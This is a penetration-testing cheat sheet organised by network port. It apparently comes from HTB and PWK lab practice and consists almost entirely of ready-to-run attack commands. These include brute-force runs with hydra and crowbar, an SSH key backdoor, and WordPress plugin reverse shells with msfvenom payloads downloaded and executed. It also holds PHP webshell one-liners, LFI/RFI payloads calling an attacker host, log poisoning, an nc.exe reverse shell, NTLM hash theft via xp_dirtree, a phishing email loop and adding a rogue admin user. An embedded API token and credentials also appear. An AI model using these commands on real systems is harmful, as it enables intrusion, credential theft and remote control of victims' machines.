### Basic Fingerprint / Banner Grabbing:
- `nc -v 192.168.1.1 25`
- `telnet 192.168.1.1 25`
- `bash -c "exec 3<>/dev/tcp/192.168.11.13/22; echo EOF>&3; cat<&3"`
- Test Connectivity:  `echo '' > /dev/tcp/192.168.11.13/22`

## 21 - FTP:
- Try Connecting Anonymously:  `ftp <ip>; USER anonymous; PASS anonymous`
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV`
- Download file (binary):  `PASSIVE; BINARY; get <file>`
    - Recursively:  `wget -m ftp://anonymous:anonymous@10.10.10.98`
- Upload file (binary) (ex. webshell to access in browser):  `PASSIVE; BINARY; put <file>`
## 22 - SSH:
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV`
- Add Backdoor (post-exploitation):
    - Attack Box:  `ssh-keygen -f <FILENAME>; chmod 600 <FILENAME>; cat <FILENAME>.pub` (copy contents)
    - Victim Box:  create <FILENAME>.pub, then: `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
    - Connect:  `ssh -i <FILENAME> <USER>@<IP>`
- CVE2008-0166:  All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.
## 25 - SMTP:
- Verify a user/email:  nc -nv 10.11.1.217 25;  VRFY root
- If you just have email addresses (maybe from cewl) and smtp port is open, try sending emails and getting response like in HTB sneakymailer (phishing, set up listener on 80):
        `while read mail; do swaks –to $mail –from it@sneakymailer.htb –header “Subject: Credentials / Errors” –body “goto http://10.10.14.4/” –server 10.10.10.197; done < mails.txt`
- For logging in and sending an email via 25, see pwk 10.11.1.229 example
- Check port 4555 remote admin tool; root/root default; change user password, then login on 110 and check
## 53 - DNS:
- IP Lookup:  `dig a domain-name-here.com @nameserver`
- MX Record Lookup:  `dig mx domain-name-here.com @nameserver`
- Recon:  `dnsenum <DOMAIN>  \\  dnsrecon -d <DOMAIN>`
- Zone Transfer:  `dnsrecon -d <DOMAIN> -a  \\  dig axfr blah.com @ns1.blah.com  \\  host -l megacorpone.com ns1.megacorpone.com  \\  Windows:  nslookup -> set type=any -> ls -d blah.com`
## 79 - Finger:
- User Enumeration:  finger @<IP>  \\  finger <USER>@<IP>
    - Script:  https://pentestmonkey.net/tools/user-enumeration/finger-user-enum with /usr/share/metasploit-framework/data/wordlists/unix_users.txt
- Command Execution:  finger "|/bin/id@<IP>"  \\  finger "|/bin/ls -a /<IP>"
## 80/443 - HTTP/HTTPS:
    Scanners:
        Automatic Web Vulnerability Scanner: Zed Attack Proxy (ZAP)
        *General Vulns:  nikto -h <URL>
            Changing User-Agent If Scanning Doesn't Work/Is Blocked:  dirb http://10.10.10.58:3000 -a "Custom Agent"
        *Directories:  gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.117 -k -x txt,php -t 50
            Other extensions: js,doc,html,asp,aspx,zip,pl,sh,json,py,cfm,rb,cgi
            Other wordlists:  /usr/share/seclists/Discovery/Web_Content/common.txt ; /usr/share/wordlists/dirb/big.txt ; /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
        Subdomains:  ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.htb -H "Host: FUZZ.schooled.htb" -fw 5338
        Wordpress:
            wpscan --url http://10.10.10.37 -e ap --plugins-detection aggressive --enumerate u --api-token RtpZ5nVvDIhoVrvHg3Aq8hu9S54yks0WH3it0A5XO8w
            WP: After access to admin panel, enumerate: Tools > Site Health
                Install plugin reverse shell: sudo apt install seclists,  cd /usr/share/seclists/Web-Shells/WordPress, sudo zip plugin-shell.zip plugin-shell.php
                Upload and install on WP plugins page
                Or just upload direct shell plugin like at:  https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
                Send commands:   curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
                Generate and transfer shell payload:  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
                    sudo msfconsole -q -x "use exploit/multi/handler;\
                    > set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
                    > set LHOST 10.11.0.4;\
                    > set LPORT 443;\
                    > run"
                     curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf
            RCE:
                Modifying a php from the theme used (admin credentials needed)
                Appearance -> Editor -> 404 Template (at the right)
                Change the content for a php shell
                https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
                http://<IP>/wp-content/themes/twentytwelve/404.php
    Techniques:
        File Upload:
            DAVTEST FOR TESTING FILE/SHELL UPLOAD (msfvenom)
            davtest -url http://10.10.10.15
            Might need to upload .html file, then rename (move) it to another type that executes a shell (like aspx)
            Upload file with curl:  curl http://10.10.10.15/ --upload-file shell.txt
                or:   curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
        Move/Rename file:  curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt
            curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt
        Code Injection/Input Boxes:
        test: try ; at end of input with additional command; try ' for sqli test
        find somewhere to inject reverse shell code
        url commands to try:
        ?code=phpinfo()
        ?code=system('id'); (if single line output)
        ?code=echo shell_exec('/sbin/ifconfig eth0'); (if multiple line output)

        Url Local File Inclusion:
        watch for [field]=... in url to access another directory
        ex. ...?page=/../../../../../etc/passwd
        *might need to add null byte terminator to end (passwd%00)
        See LFI Interesting Files
        LFI: put %00 at end:
        http://target.com/?page=./../../../../../../../../../etc/passwd%00
        LFI Cheat Sheat/reverse shell methods:  https://highon.coffee/blog/lfi-cheat-sheet/

        RFI: put %00 at end:
        http://target.com/?page=http://hackerip/evil.txt%00

        LFI TO RCE:
        try log poisoning (ex. log into ftp server with user of '<? php system($_GET['cmd']); ?>' , then lfi the var/log/vsftpd.log
            or with /var/log/apache2/access.log:   nc 1.1.1.1 80, then GET /<?php system($_GET['cmd']);?>
            or with /proc/self/environ, use burp (https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) to send malicious url with a modified user-agent
            or with windows ?file=c:\xampp\apache\logs\access.log&cmd=ipconfig   nc -nv 1.1.1.1 80 ,   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
        sending email server a script method (https://bitvijays.github.io/LFC-VulnerableMachines.html)

        Url Remote File Inclusion:
        Try shell saved as .txt, .php, etc. - see what type of scripts the site uses
        works if allow_url_fopen and allow_url_include both = On in the file /etc/php5/cgi/php.ini -- php.ini location is seen in phpinfo.php file
        store remote shell code on your server
        ?page=http://1.2.3.4/reverse.txt?
        ?page=http://1.2.3.4/reverse.txt%00
        might need the ? or %00 at end of url
        save as txt file on your computer
        ex. see reverse.txt php file
        Shell Methods:
        /proc/self/environ method--modify request (user-agent field) w/ burpsuite and upload reverse shell .txt file

## 88 - Kerberos:
- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
## 110 - POP3:
- Brute Force:  `hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V  \\  hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V`
- Read Mail (w/ creds):  `telnet 10.10.10.17 110; USER bob; PASS password123; LIST; RETR <mail #>; QUIT`
- Other commands: http://sunnyoasis.com/services/emailviatelnet.html
## 139/445 - SMB:
- `nmap -script smb-vuln* -script-args=unsafe=1 -p139,445 <IP>`
- Sniff version:  `sudo ngrep -i -d <interface> 's.?a.?m.?b.?a*[[:digit:]]' port 139  ;  smbclient -L <IP>  \\  Or MSF:  use auxiliary/scanner/smb/smb_version`
- View Shares:  `smbmap -H <IP>  \\  smbclient -L <IP>`
- Enumerate:  `enum4linux [-a] <IP>`
- Brute Force:  `hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV`
- Connect:  `Anonymous: smbclient //$ip/share -N  \\  smbclient \\\\$ip\\$share [-U <user>]  \\  smbclient -L <IP> -U administrator  (or anonymous)`
    - Commands:  `help, get, put, etc.`
- Null session with rpcclient (MS-RPC) for legacy samba or SMB:  `rpcclient -U "" [target IP address]  ;  enumdomusers`
- Exploitation Example:
    
`Connect, Upload and get shell via web:    
(1: initial, unstable shell): msfvenom -p php/reverse_php LHOST=10.10.14.18 LPORT=4444 -o rev.php
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put rev.php' -> Visit in browser     
(2: switch to stable shell w/ nc)
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/windows-resources/binaries/nc.exe nc.exe'
##smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /home/user/simplephpwebshell.php cmd.php'
In first shell: nc.exe 10.10.14.18 4445 -e cmd.exe`
## 161 - SNMP:
- Probe with snmpwalk if we know the community string (often is 'public'):
    - mib tree:   `snmpwalk -c public -v1 -t 10 10.11.1.14`
    - windows users:   `snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25`
    - running windows processes:  `snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2`
    - installed software:   `snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2`
- Brute Force Community String:  `onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>`
- Enumerate:  `snmpwalk -c public -v 1 10.10.10.116  \\  snmpwalk -v3 -l authNoPriv -u authOnlyUser -a MD5 -A MyPassword123 192.168.1.2  \\  snmp-check 192.168.1.2 -c public`
- **Enumerate: https://github.com/dheiland-r7/snmp:  `perl snmpbw.pl 10.10.10.241 public 2 4`
## 389 - LDAP:
- Run Scans:  `nmap -n -sV --script "ldap* and not brute" <IP>`
- `ldapsearch -h <IP> -x -s base`
- `ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"`
- GUI:  jxplorer
## 1433 - MSSQL:
- Scan:  `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>`
- Brute Force:  `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u`
- With Creds:
    
        mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
        mssqlclient.py <USER>:<PASSWORD>@<IP>
        # Once logged in you can run queries:
        SQL> select @@ version;
        # Steal NTLM hash
        sudo smbserver.py -smb2support liodeus .
        SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
        # Try to enable code execution
        SQL> enable_xp_cmdshell
        # Execute code
        SQL> xp_cmdshell whoami /all
        SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe

## 2049 - NFS:
- View Shares:  `showmount -e <IP>`
- Mount Share Locally:  `sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>`
- View Exported Shares:  `cat /etc/exports`
- Privesc: look for no_root_squash/no_all_squash
## 3306 - MYSQL:
- Brute Force:  `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u`
- Local Connect:  `mysql -u <user> -p <password> [-e 'show databases;'  \\  -e 'use drupal; show tables; select * from users;']`
    - IF MYSQL LOCAL LOGIN DOESN'T WORK, USE MYSQLDUMP (or look for other mysql programs on box) (or use tool like Chisel):
        - `mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic`
    - ex. Setup local mysql database to connect to w/ adminer:  https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
- Remote Connect:  `mysql -h <IP> -u <USER>`
- Commands:
    
        show databases;
        use <DATABASES>;
        show tables;
        describe <TABLE>;
        select * from <TABLE>;
        # Try to execute code
        select do_system('id');
        \! sh
        # Read & Write
        select load_file('<FILE>');
        select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
    
## 3389 - RDP:
- Regular login:   `rdesktop [-d <DOMAIN>] -u <USERNAME> [-p <PASS>] <IP>  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP> +clipboard`
- PTH:  `xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>`
- Brute Force:  `crowbar -b rdp -s <IP>/CIDR [-u <USER>  \\  -U <USERLIST>] -C <PASSWORDS_LIST>  \\  hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV`
- Add RDP User:  `net user <user> <pass> /add; net localgroup "Administrators" <USER> /add; net localgroup "Remote Desktop Users" <USER> /add`
## 3690 - SVN Server:
        svn info svn://10.10.10.203
        svn list svn://10.10.10.203
        svn export svn://10.10.10.203/moved.txt
        svn export svn://10.10.10.203/dimension.worker.htb/,  svn checkout -r 1 svn://worker.htb,  svn checkout -r 2 svn://worker.htb
## 5800/5900/5901/58001 - VNC:
- Scan:  `nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>`
- Brute Force:  `hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV`
- Connect:  `vncviewer <IP>:<PORT>`
- Default Password Locations:
    - Linux: ~/.vnc/passwd
    - Windows:
            # RealVNC:  HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
            # TightVNC:  HKEY_CURRENT_USER\Software\TightVNC\Server
            # TigerVNC:  HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
            # UltraVNC:  C:\Program Files\UltraVNC\ultravnc.ini
## 5985/5986 - WINRM:
- Brute Force:  `crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>`
- Connect:  `evil-winrm -i <IP> -u <USER> -p <PASSWORD>  \\  evil-winrm -i <IP> -u <USER> -H <HASH>`
